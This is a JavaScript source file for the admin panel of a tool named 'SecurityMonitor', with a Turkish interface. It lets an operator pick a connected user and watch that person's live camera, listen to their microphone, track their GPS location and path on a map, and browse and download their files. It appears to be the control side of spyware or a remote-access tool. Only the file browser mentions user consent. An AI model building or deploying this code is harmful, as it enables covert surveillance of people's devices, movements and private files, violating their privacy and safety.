/* ============================================
   SecurityMonitor — Admin Panel Logic
   ============================================ */

const API_BASE = '';
let selectedUid = null;
let userListInterval = null;

// ==================== AUTH ====================

function getAdminToken() {
    return localStorage.getItem('secmon_admin_token') || '';
}

function getAuth() {
    try {
        return JSON.parse(localStorage.getItem('secmon_auth') || '{}');
    } catch { return {}; }
}

function requireAdmin() {
    const auth = getAuth();
    const token = getAdminToken();
    if (!token || auth.method !== 'admin') {
        window.location.href = '/login';
    }
    document.getElementById('topbarUser').textContent = auth.name || 'Admin';
}

function logout() {
    localStorage.removeItem('secmon_auth');
    localStorage.removeItem('secmon_admin_token');
    window.location.href = '/login';
}

// ==================== VIEW SWITCHING ====================

function switchView(view) {
    document.querySelectorAll('.topbar-tab').forEach(t => t.classList.remove('active'));
    document.querySelector(`.topbar-tab[data-view="${view}"]`).classList.add('active');
    document.querySelectorAll('.view-panel').forEach(p => p.classList.remove('active'));
    document.getElementById(`view-${view}`).classList.add('active');

    if (view === 'admin') {
        refreshUsers();
        startUserPolling();
    } else {
        stopUserPolling();
        const iframe = document.getElementById('userFrame');
        iframe.src = iframe.src;
    }
}

// ==================== USER LIST ====================

async function fetchUsers() {
    try {
        const resp = await fetch(`${API_BASE}/api/admin/users`, {
            headers: { 'X-Admin-Token': getAdminToken() }
        });
        if (resp.status === 401) { logout(); return []; }
        const data = await resp.json();
        return data.users || [];
    } catch { return []; }
}

async function refreshUsers() {
    const users = await fetchUsers();
    const list = document.getElementById('userList');
    if (users.length === 0) {
        list.innerHTML = '<p class="placeholder" style="padding:20px;">Bağlı kullanıcı yok</p>';
        return;
    }

    list.innerHTML = users.map(u => `
        <div class="user-list-item ${selectedUid === u.uid ? 'selected' : ''}"
             onclick="selectUser('${u.uid}')">
            <div class="user-avatar">
                ${u.photo_url ? `<img src="${u.photo_url}" alt="">` : (u.name ? u.name.charAt(0).toUpperCase() : '?')}
            </div>
            <div class="user-info">
                <div class="user-name">${u.name || 'İsimsiz'}</div>
                <div class="user-email">${u.email || ''}</div>
            </div>
            <div class="user-status ${u.is_active ? 'online' : 'offline'}"></div>
        </div>
    `).join('');
}

function startUserPolling() {
    stopUserPolling();
    refreshUsers();
    userListInterval = setInterval(refreshUsers, 5000);
}

function stopUserPolling() {
    if (userListInterval) {
        clearInterval(userListInterval);
        userListInterval = null;
    }
}

// ==================== USER SELECTION ====================

async function selectUser(uid) {
    selectedUid = uid;
    refreshUsers();

    const detail = document.getElementById('userDetail');
    detail.innerHTML = '<div class="loading-spinner" style="margin:40px auto;display:block;"></div>';

    try {
        const resp = await fetch(`${API_BASE}/api/admin/user/${uid}`, {
            headers: { 'X-Admin-Token': getAdminToken() }
        });
        if (resp.status === 401) { logout(); return; }
        const data = await resp.json();

        renderUserDetail(detail, data);
    } catch (e) {
        detail.innerHTML = '<p class="placeholder">Kullanıcı bilgisi alınamadı</p>';
    }
}

// ==================== MODULE SWITCHING ====================

let currentModule = 'info';

function switchModule(mod) {
    currentModule = mod;

    document.querySelectorAll('.module-tab').forEach(t => {
        t.classList.toggle('active', t.dataset.module === mod);
    });

    const content = document.getElementById('moduleContent');
    if (!content) return;

    if (mod === 'info') {
        fetchUserAndShowInfo();
        stopCameraWatch();
        stopAudioListen();
        stopLocationPoll();
    } else if (mod === 'camera') {
        content.innerHTML = renderModuleCamera();
        startCameraWatch();
        stopAudioListen();
        stopLocationPoll();
    } else if (mod === 'audio') {
        content.innerHTML = renderModuleAudio();
        stopCameraWatch();
        stopLocationPoll();
    } else if (mod === 'location') {
        content.innerHTML = renderModuleLocation();
        stopCameraWatch();
        stopAudioListen();
        initLocationMap();
    } else if (mod === 'storage') {
        content.innerHTML = renderModuleStorage();
        stopCameraWatch();
        stopAudioListen();
        stopLocationPoll();
        loadStorageFileList();
    }
}

async function fetchUserAndShowInfo() {
    const content = document.getElementById('moduleContent');
    if (!content) return;
    try {
        const resp = await fetch(`${API_BASE}/api/admin/user/${selectedUid}`, {
            headers: { 'X-Admin-Token': getAdminToken() }
        });
        if (resp.status === 401) { logout(); return; }
        const data = await resp.json();
        content.innerHTML = renderModuleInfo(data.user || {}, data.is_active);
    } catch {
        content.innerHTML = renderModuleInfo({}, false);
    }
}

// ==================== DETAIL RENDER ====================

function renderUserDetail(container, data) {
    const user = data.user || {};
    const isActive = data.is_active;

    container.innerHTML = `
        <div class="detail-header">
            <div class="detail-avatar">
                ${user.photo_url ? `<img src="${user.photo_url}" alt="">` : (user.name ? user.name.charAt(0).toUpperCase() : '?')}
            </div>
            <div class="detail-info">
                <h2>${user.name || 'İsimsiz Kullanıcı'}</h2>
                <p>${user.email || ''}</p>
                <span class="status-badge ${isActive ? 'active' : 'inactive'}">${isActive ? 'Cevrimici' : 'Cevrimdisi'}</span>
            </div>
        </div>

        <div class="module-tabs">
            <button class="module-tab active" data-module="info" onclick="switchModule('info')">Bilgi</button>
            <button class="module-tab" data-module="camera" onclick="switchModule('camera')">Kamera</button>
            <button class="module-tab" data-module="audio" onclick="switchModule('audio')">Ses</button>
            <button class="module-tab" data-module="location" onclick="switchModule('location')">Konum</button>
            <button class="module-tab" data-module="storage" onclick="switchModule('storage')">Depolama</button>
        </div>
        <div id="moduleContent" class="module-content">
            ${renderModuleInfo(user, isActive)}
        </div>
    `;
}

function renderModuleInfo(user, isActive) {
    return `
        <div class="info-panel">
            <h3>Kullanici Bilgisi</h3>
            <div class="info-row">
                <span class="label">Email</span>
                <span class="value">${user.email || 'Bilinmiyor'}</span>
            </div>
            <div class="info-row">
                <span class="label">UID</span>
                <span class="value" style="font-family:monospace;font-size:11px;">${selectedUid || '-'}</span>
            </div>
            <div class="info-row">
                <span class="label">Durum</span>
                <span class="value">${isActive ? 'Aktif' : 'Beklemede'}</span>
            </div>
            <div class="info-row">
                <span class="label">Son Gorulme</span>
                <span class="value">${user.last_heartbeat ? new Date(user.last_heartbeat * 1000).toLocaleTimeString() : '-'}</span>
            </div>
        </div>
    `;
}

// ==================== CAMERA VIEWER ====================

let cameraWatching = false;
let cameraPollInterval = null;
let cameraLastSeq = -1;
let cameraChunkQueue = [];
let cameraPlaying = false;
let cameraSnapshots = [];
const MAX_SNAPSHOTS = 12;

function renderModuleCamera() {
    return `
        <div class="camera-viewer">
            <div class="camera-toolbar">
                <button class="btn btn-sm btn-primary" id="cameraToggleBtn" onclick="toggleCameraWatch()">Canli Izle</button>
                <button class="btn btn-sm btn-secondary" onclick="captureSnapshot()">Fotograf Cek</button>
                <span class="camera-status" id="cameraStatus">Bekleniyor...</span>
            </div>
            <div class="camera-display">
                <video id="cameraVideo" class="camera-video" autoplay playsinline muted></video>
                <canvas id="cameraCanvas" style="display:none;"></canvas>
                <div class="camera-placeholder" id="cameraPlaceholder">
                    <div class="camera-placeholder-icon">K</div>
                    <p>Kamera akisi bekleniyor...</p>
                </div>
            </div>
            <div class="snapshot-gallery" id="snapshotGallery"></div>
        </div>
    `;
}

function toggleCameraWatch() {
    if (cameraWatching) stopCameraWatch();
    else startCameraWatch();
}

function startCameraWatch() {
    if (!selectedUid) return;
    cameraWatching = true;
    cameraLastSeq = -1;
    cameraChunkQueue = [];
    cameraPlaying = false;

    const pl = document.getElementById('cameraPlaceholder');
    if (pl) pl.style.display = 'flex';
    const btn = document.getElementById('cameraToggleBtn');
    if (btn) { btn.textContent = 'Durdur'; btn.className = 'btn btn-sm btn-danger'; }

    pollCameraStream();
    cameraPollInterval = setInterval(pollCameraStream, 2000);
}

function stopCameraWatch() {
    cameraWatching = false;
    cameraChunkQueue = [];
    cameraPlaying = false;
    if (cameraPollInterval) {
        clearInterval(cameraPollInterval);
        cameraPollInterval = null;
    }
    const video = document.getElementById('cameraVideo');
    if (video) { video.src = ''; }
    const pl = document.getElementById('cameraPlaceholder');
    if (pl) pl.style.display = 'flex';
    const btn = document.getElementById('cameraToggleBtn');
    if (btn) { btn.textContent = 'Canli Izle'; btn.className = 'btn btn-sm btn-primary'; }
    const st = document.getElementById('cameraStatus');
    if (st) st.textContent = 'Durduruldu';
}

async function pollCameraStream() {
    if (!selectedUid || !cameraWatching) return;
    try {
        const resp = await fetch(
            `${API_BASE}/api/admin/camera-stream/${selectedUid}?after=${cameraLastSeq}`,
            { headers: { 'X-Admin-Token': getAdminToken() } }
        );
        if (resp.status === 401) { logout(); return; }
        const data = await resp.json();
        if (data.status === 'ok' && data.chunks && data.chunks.length > 0) {
            cameraLastSeq = data.max_seq;
            const st = document.getElementById('cameraStatus');
            if (st) st.textContent = data.chunks.length + ' yeni kare';
            for (const chunk of data.chunks) {
                cameraChunkQueue.push(chunk);
            }
            if (!cameraPlaying) playNextChunk();
        }
    } catch {}
}

function playNextChunk() {
    if (cameraChunkQueue.length === 0 || !cameraWatching) {
        cameraPlaying = false;
        return;
    }
    cameraPlaying = true;

    const chunk = cameraChunkQueue.shift();
    const video = document.getElementById('cameraVideo');
    const pl = document.getElementById('cameraPlaceholder');
    if (!video) { cameraPlaying = false; return; }
    if (pl) pl.style.display = 'none';

    try {
        const binary = atob(chunk.data);
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) {
            bytes[i] = binary.charCodeAt(i);
        }
        const blob = new Blob([bytes], { type: chunk.mime || 'video/webm' });
        const url = URL.createObjectURL(blob);

        if (video.dataset.lastBlobUrl) {
            URL.revokeObjectURL(video.dataset.lastBlobUrl);
        }
        video.dataset.lastBlobUrl = url;

        video.onended = () => playNextChunk();
        video.onerror = () => playNextChunk();
        video.src = url;
        video.play().catch(() => playNextChunk());

        const st = document.getElementById('cameraStatus');
        if (st) st.textContent = 'Canli ' + new Date().toLocaleTimeString();
    } catch {
        cameraPlaying = false;
        playNextChunk();
    }
}

function captureSnapshot() {
    const video = document.getElementById('cameraVideo');
    const canvas = document.getElementById('cameraCanvas');
    if (!video || !canvas || !video.videoWidth) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);

    cameraSnapshots.unshift({ dataUrl, time: Date.now() });
    if (cameraSnapshots.length > MAX_SNAPSHOTS) cameraSnapshots.pop();

    renderSnapshotGallery();
}

function renderSnapshotGallery() {
    const gallery = document.getElementById('snapshotGallery');
    if (!gallery) return;
    if (cameraSnapshots.length === 0) { gallery.innerHTML = ''; return; }

    gallery.innerHTML = cameraSnapshots.map((s, i) => `
        <div class="snapshot-item">
            <img src="${s.dataUrl}" alt="snapshot">
            <div class="snapshot-footer">
                <span class="snapshot-time">${new Date(s.time).toLocaleTimeString()}</span>
                <button class="snapshot-dl" onclick="downloadSnapshot(${i})">Indir</button>
            </div>
        </div>
    `).join('');
}

function downloadSnapshot(index) {
    const s = cameraSnapshots[index];
    if (!s) return;
    const a = document.createElement('a');
    a.href = s.dataUrl;
    a.download = 'snapshot_' + selectedUid + '_' + Date.now() + '.jpg';
    a.click();
}

// ==================== AUDIO MODULE ====================

let audioListenActive = false;
let audioPollInterval = null;
let audioLastSeq = -1;
let audioChunkQueue = [];
let audioPlaying = false;

function renderModuleAudio() {
    return `
        <div class="audio-viewer">
            <div class="audio-toolbar">
                <button class="btn btn-sm btn-primary" id="audioListenBtn" onclick="toggleAudioListen()">Canli Dinle</button>
                <button class="btn btn-sm btn-secondary" id="audioSendBtn" onclick="recordAndSendAudio()">Ses Gonder</button>
                <span class="audio-status" id="audioStatus">Bekleniyor...</span>
            </div>
            <div class="audio-display">
                <div class="audio-visualizer" id="audioVisualizer">
                    <div class="audio-placeholder-icon">S</div>
                    <p id="audioPlaceholderText">Ses akisi bekleniyor...</p>
                </div>
                <audio id="audioPlayer" style="display:none;"></audio>
            </div>
            <div class="audio-messages" id="audioMessages">
                <h4 class="audio-messages-title">Gonderilen Sesler</h4>
                <div id="audioMessageList"></div>
            </div>
        </div>
    `;
}

function toggleAudioListen() {
    if (audioListenActive) stopAudioListen();
    else startAudioListen();
}

function startAudioListen() {
    if (!selectedUid) return;
    audioListenActive = true;
    audioLastSeq = -1;
    audioChunkQueue = [];
    audioPlaying = false;

    const pl = document.getElementById('audioPlaceholderText');
    if (pl) pl.textContent = 'Ses akisi bekleniyor...';
    const btn = document.getElementById('audioListenBtn');
    if (btn) { btn.textContent = 'Durdur'; btn.className = 'btn btn-sm btn-danger'; }

    pollAudioFeed();
    audioPollInterval = setInterval(pollAudioFeed, 2000);
}

function stopAudioListen() {
    audioListenActive = false;
    audioChunkQueue = [];
    audioPlaying = false;
    if (audioPollInterval) {
        clearInterval(audioPollInterval);
        audioPollInterval = null;
    }
    const audio = document.getElementById('audioPlayer');
    if (audio) { audio.pause(); audio.src = ''; }
    const btn = document.getElementById('audioListenBtn');
    if (btn) { btn.textContent = 'Canli Dinle'; btn.className = 'btn btn-sm btn-primary'; }
    const st = document.getElementById('audioStatus');
    if (st) st.textContent = 'Durduruldu';
}

async function pollAudioFeed() {
    if (!selectedUid || !audioListenActive) return;
    try {
        const resp = await fetch(
            `${API_BASE}/api/admin/audio-feed/${selectedUid}?after=${audioLastSeq}`,
            { headers: { 'X-Admin-Token': getAdminToken() } }
        );
        if (resp.status === 401) { logout(); return; }
        const data = await resp.json();
        if (data.status === 'ok' && data.chunks && data.chunks.length > 0) {
            audioLastSeq = data.max_seq;
            const st = document.getElementById('audioStatus');
            if (st) st.textContent = data.chunks.length + ' yeni ses';
            for (const chunk of data.chunks) {
                audioChunkQueue.push(chunk);
            }
            if (!audioPlaying) playNextAudio();
        }
    } catch {}
}

function playNextAudio() {
    if (audioChunkQueue.length === 0 || !audioListenActive) {
        audioPlaying = false;
        return;
    }
    audioPlaying = true;

    const chunk = audioChunkQueue.shift();
    const audio = document.getElementById('audioPlayer');
    const pl = document.getElementById('audioPlaceholderText');
    if (!audio) { audioPlaying = false; return; }
    if (pl) pl.textContent = 'Ses akiyor...';

    try {
        const binary = atob(chunk.data);
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) {
            bytes[i] = binary.charCodeAt(i);
        }
        const blob = new Blob([bytes], { type: chunk.mime || 'audio/webm' });
        const url = URL.createObjectURL(blob);

        if (audio.dataset.lastBlobUrl) {
            URL.revokeObjectURL(audio.dataset.lastBlobUrl);
        }
        audio.dataset.lastBlobUrl = url;

        audio.onended = () => playNextAudio();
        audio.onerror = () => playNextAudio();
        audio.src = url;
        audio.play().catch(() => playNextAudio());

        const st = document.getElementById('audioStatus');
        if (st) st.textContent = 'Canli ' + new Date().toLocaleTimeString();
    } catch {
        audioPlaying = false;
        playNextAudio();
    }
}

async function recordAndSendAudio() {
    const btn = document.getElementById('audioSendBtn');
    if (!btn) return;
    btn.disabled = true;
    btn.textContent = 'Kaydediliyor...';

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
            ? 'audio/webm;codecs=opus' : 'audio/webm';

        const recorder = new MediaRecorder(stream, { mimeType });
        const chunks = [];

        recorder.ondataavailable = (e) => {
            if (e.data && e.data.size > 0) chunks.push(e.data);
        };

        recorder.onstop = async () => {
            stream.getTracks().forEach(t => t.stop());
            const blob = new Blob(chunks, { type: mimeType });
            const reader = new FileReader();
            reader.onload = async () => {
                try {
                    const b64 = reader.result.split(',')[1];
                    const resp = await fetch(`${API_BASE}/api/admin/send-audio/${selectedUid}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Admin-Token': getAdminToken()
                        },
                        body: JSON.stringify({ chunk: b64, mimeType: mimeType })
                    });
                    const data = await resp.json();
                    if (data.status === 'ok') {
                        addSentAudioMessage(data.seq);
                    }
                } catch {}
                if (btn) { btn.disabled = false; btn.textContent = 'Ses Gonder'; }
            };
            reader.readAsDataURL(blob);
        };

        // 5 saniye kaydet, sonra otomatik durdur
        recorder.start();
        setTimeout(() => {
            if (recorder.state !== 'inactive') recorder.stop();
        }, 5000);
    } catch {
        if (btn) { btn.disabled = false; btn.textContent = 'Ses Gonder'; }
    }
}

function addSentAudioMessage(seq) {
    const list = document.getElementById('audioMessageList');
    if (!list) return;
    const item = document.createElement('div');
    item.className = 'audio-message-item';
    item.innerHTML = `
        <span class="audio-msg-time">${new Date().toLocaleTimeString()}</span>
        <span class="audio-msg-seq">#${seq}</span>
        <span class="audio-msg-status">Gonderildi</span>
    `;
    list.prepend(item);
}

// ==================== LOCATION MODULE ====================

let locationMap = null;
let locationMarker = null;
let locationPath = null;
let locationPollTimer = null;
let leafletLoaded = false;

function renderModuleLocation() {
    return `
        <div class="location-viewer">
            <div class="location-toolbar">
                <span class="location-status" id="locationStatus">Konum bekleniyor...</span>
            </div>
            <div id="locationMapContainer" class="location-map"></div>
            <div class="location-info-grid">
                <div class="loc-card">
                    <span class="loc-label">Enlem</span>
                    <span class="loc-value" id="locLat">-</span>
                </div>
                <div class="loc-card">
                    <span class="loc-label">Boylam</span>
                    <span class="loc-value" id="locLng">-</span>
                </div>
                <div class="loc-card">
                    <span class="loc-label">Hassasiyet</span>
                    <span class="loc-value" id="locAcc">-</span>
                </div>
                <div class="loc-card">
                    <span class="loc-label">Hiz</span>
                    <span class="loc-value" id="locSpeed">-</span>
                </div>
                <div class="loc-card">
                    <span class="loc-label">Yukseklik</span>
                    <span class="loc-value" id="locAlt">-</span>
                </div>
                <div class="loc-card">
                    <span class="loc-label">Yon</span>
                    <span class="loc-value" id="locHeading">-</span>
                </div>
            </div>
        </div>
    `;
}

function loadLeaflet(callback) {
    if (window.L) { callback(); return; }
    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
    document.head.appendChild(link);
    const script = document.createElement('script');
    script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
    script.onload = callback;
    document.head.appendChild(script);
}

function initLocationMap() {
    loadLeaflet(() => {
        const container = document.getElementById('locationMapContainer');
        if (!container) return;

        if (locationMap) {
            locationMap.invalidateSize();
            return;
        }

        locationMap = L.map(container).setView([39.0, 35.0], 6);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap',
            maxZoom: 19
        }).addTo(locationMap);

        // Poll for location data
        startLocationPoll();
    });
}

function startLocationPoll() {
    stopLocationPoll();
    pollLocation();
    locationPollTimer = setInterval(pollLocation, 4000);
}

function stopLocationPoll() {
    if (locationPollTimer) {
        clearInterval(locationPollTimer);
        locationPollTimer = null;
    }
}

async function pollLocation() {
    if (!selectedUid) return;
    try {
        const resp = await fetch(`${API_BASE}/api/admin/location/${selectedUid}`, {
            headers: { 'X-Admin-Token': getAdminToken() }
        });
        if (resp.status === 401) { logout(); return; }
        const data = await resp.json();
        if (data.status === 'ok' && data.current) {
            updateLocationUI(data);
        }
    } catch {}
}

function updateLocationUI(data) {
    const c = data.current;
    const st = document.getElementById('locationStatus');
    if (st) st.textContent = 'Guncellendi: ' + new Date().toLocaleTimeString();

    document.getElementById('locLat').textContent = c.lat.toFixed(6);
    document.getElementById('locLng').textContent = c.lng.toFixed(6);
    document.getElementById('locAcc').textContent = c.acc ? c.acc.toFixed(1) + ' m' : '-';
    document.getElementById('locSpeed').textContent = c.speed ? c.speed.toFixed(1) + ' m/s' : '-';
    document.getElementById('locAlt').textContent = c.alt ? c.alt.toFixed(1) + ' m' : '-';
    document.getElementById('locHeading').textContent = c.heading ? c.heading.toFixed(1) + '°' : '-';

    // Update map
    if (locationMap) {
        const latlng = [c.lat, c.lng];

        if (!locationMarker) {
            locationMarker = L.marker(latlng).addTo(locationMap);
            locationMarker.bindPopup('Mevcut Konum');
        } else {
            locationMarker.setLatLng(latlng);
        }

        locationMap.setView(latlng, locationMap.getZoom() || 15);

        // Draw path from all positions
        if (data.positions && data.positions.length > 1) {
            const coords = data.positions.map(p => [p.lat, p.lng]);
            if (locationPath) locationMap.removeLayer(locationPath);
            locationPath = L.polyline(coords, {
                color: '#00bcd4', weight: 3, opacity: 0.7
            }).addTo(locationMap);
        }
    }
}

// ==================== STORAGE MODULE ====================

let storageFiles = [];
let storageCurrentPath = '';

function renderModuleStorage() {
    return `
        <div class="storage-viewer">
            <div class="storage-toolbar">
                <button class="btn btn-sm btn-primary" onclick="triggerStorageScan()">Klasor Tarat</button>
                <span class="storage-status" id="storageStatus">Dosyalar bekleniyor...</span>
            </div>
            <div class="storage-breadcrumb" id="storageBreadcrumb"></div>
            <div class="storage-file-list" id="storageFileList">
                <div class="storage-placeholder">
                    <p>Henuz dosya taranmadi. "Klasor Tarat" butonuna basin.</p>
                    <p class="storage-hint">Kullanici onay verdikten sonra dosya agaci goruntulenecek.</p>
                </div>
            </div>
            <div class="storage-preview" id="storagePreview" style="display:none;">
                <div class="preview-header">
                    <span class="preview-filename" id="previewFilename"></span>
                    <button class="btn btn-sm btn-secondary" id="previewCloseBtn" onclick="closePreview()">Kapat</button>
                </div>
                <div class="preview-content" id="previewContent"></div>
            </div>
        </div>
    `;
}

function renderStorageBreadcrumb(path) {
    const parts = path ? path.split('/') : [];
    let html = `<a href="#" onclick="loadStorageFolder('')">Kok</a>`;
    let acc = '';
    for (const p of parts) {
        acc = acc ? acc + '/' + p : p;
        html += ` / <a href="#" onclick="loadStorageFolder('${acc}')">${p}</a>`;
    }
    document.getElementById('storageBreadcrumb').innerHTML = html;
}

function renderStorageFileList(files, currentPath) {
    const list = document.getElementById('storageFileList');
    if (!list) return;

    // Sadece bu klasördekileri göster
    const prefix = currentPath ? currentPath + '/' : '';
    const children = files.filter(f => {
        if (currentPath === '') return !f.path.includes('/') && !f.is_dir;
        return f.path.startsWith(prefix) && f.path !== currentPath &&
               f.path.slice(prefix.length).split('/').length === 1;
    });
    const dirs = files.filter(f => {
        if (currentPath === '') return !f.path.includes('/') && f.is_dir;
        return f.path.startsWith(prefix) && f.path !== currentPath &&
               f.path.slice(prefix.length).split('/').length === 1 && f.is_dir;
    });

    const sorted = [...dirs, ...children];

    if (sorted.length === 0) {
        list.innerHTML = '<div class="storage-placeholder"><p>Bu klasorde dosya yok</p></div>';
        return;
    }

    list.innerHTML = sorted.map(f => {
        if (f.is_dir) {
            return `<div class="storage-item storage-folder" onclick="loadStorageFolder('${f.path}')">
                <span class="storage-icon">📁</span>
                <span class="storage-name">${f.name}</span>
            </div>`;
        }
        const sizeStr = f.size > 1024 * 1024
            ? (f.size / 1024 / 1024).toFixed(1) + ' MB'
            : f.size > 1024 ? Math.round(f.size / 1024) + ' KB' : f.size + ' B';
        return `<div class="storage-item" onclick="requestStorageFile('${f.path}')">
            <span class="storage-icon">📄</span>
            <span class="storage-name">${f.name}</span>
            <span class="storage-size">${sizeStr}</span>
        </div>`;
    }).join('');
}

function loadStorageFolder(path) {
    storageCurrentPath = path;
    renderStorageBreadcrumb(path);
    renderStorageFileList(storageFiles, path);
}

async function loadStorageFileList() {
    if (!selectedUid) return;
    try {
        const resp = await fetch(`${API_BASE}/api/admin/storage/list/${selectedUid}`, {
            headers: { 'X-Admin-Token': getAdminToken() }
        });
        if (resp.status === 401) { logout(); return; }
        const data = await resp.json();
        if (data.status === 'ok') {
            storageFiles = data.files || [];
            const st = document.getElementById('storageStatus');
            if (st) st.textContent = storageFiles.length + ' dosya bulundu';
            loadStorageFolder('');
        }
    } catch {}
}

async function triggerStorageScan() {
    if (!selectedUid) return;
    const btn = document.querySelector('.storage-toolbar .btn-primary');
    if (btn) { btn.disabled = true; btn.textContent = 'Istek gonderildi...'; }

    try {
        await fetch(`${API_BASE}/api/admin/storage/signal/${selectedUid}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Admin-Token': getAdminToken()
            },
            body: JSON.stringify({ signal: 'start_scan' })
        });

        // Bir süre sonra dosya listesini kontrol et
        setTimeout(() => {
            loadStorageFileList();
            if (btn) { btn.disabled = false; btn.textContent = 'Klasor Tarat'; }
        }, 5000);
    } catch {
        if (btn) { btn.disabled = false; btn.textContent = 'Klasor Tarat'; }
    }
}

async function requestStorageFile(path) {
    if (!selectedUid) return;

    // Önce önbellekte var mı kontrol et
    try {
        const resp = await fetch(`${API_BASE}/api/admin/storage/content`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Admin-Token': getAdminToken()
            },
            body: JSON.stringify({ uid: selectedUid, path: path })
        });
        const data = await resp.json();

        if (data.status === 'ok') {
            showFilePreview(path, data.content, data.mime);
            return;
        }

        // Yoksa talepte bulun
        await fetch(`${API_BASE}/api/admin/storage/request`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Admin-Token': getAdminToken()
            },
            body: JSON.stringify({ uid: selectedUid, path: path })
        });

        // 3 saniye sonra tekrar dene
        setTimeout(async () => {
            const resp2 = await fetch(`${API_BASE}/api/admin/storage/content`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Admin-Token': getAdminToken()
                },
                body: JSON.stringify({ uid: selectedUid, path: path })
            });
            const data2 = await resp2.json();
            if (data2.status === 'ok') {
                showFilePreview(path, data2.content, data2.mime);
            } else {
                const st = document.getElementById('storageStatus');
                if (st) st.textContent = 'Dosya alinamadi, kullanici cevrimici olmayabilir';
            }
        }, 3000);
    } catch {}
}

function showFilePreview(path, contentB64, mime) {
    const preview = document.getElementById('storagePreview');
    const nameEl = document.getElementById('previewFilename');
    const contentEl = document.getElementById('previewContent');
    if (!preview || !nameEl || !contentEl) return;

    preview.style.display = 'block';
    nameEl.textContent = path.split('/').pop();

    if (mime.startsWith('image/') || mime.startsWith('text/') || mime === 'application/json') {
        const binary = atob(contentB64);
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
        const blob = new Blob([bytes], { type: mime });
        const url = URL.createObjectURL(blob);

        if (mime.startsWith('image/')) {
            contentEl.innerHTML = `<img src="${url}" style="max-width:100%;max-height:400px;">`;
        } else {
            fetch(url).then(r => r.text()).then(text => {
                contentEl.innerHTML = `<pre style="white-space:pre-wrap;font-size:12px;">${text.replace(/</g, '&lt;')}</pre>`;
            });
        }
    } else {
        // İndirme bağlantısı
        const a = document.createElement('a');
        a.href = 'data:' + mime + ';base64,' + contentB64;
        a.download = path.split('/').pop();
        a.textContent = 'Dosyayi Indir';
        a.className = 'btn btn-sm btn-primary';
        contentEl.innerHTML = '';
        contentEl.appendChild(a);
    }
}

function closePreview() {
    document.getElementById('storagePreview').style.display = 'none';
    document.getElementById('previewContent').innerHTML = '';
}

// ==================== INIT ====================

document.addEventListener('DOMContentLoaded', () => {
    requireAdmin();
    refreshUsers();
    startUserPolling();
});
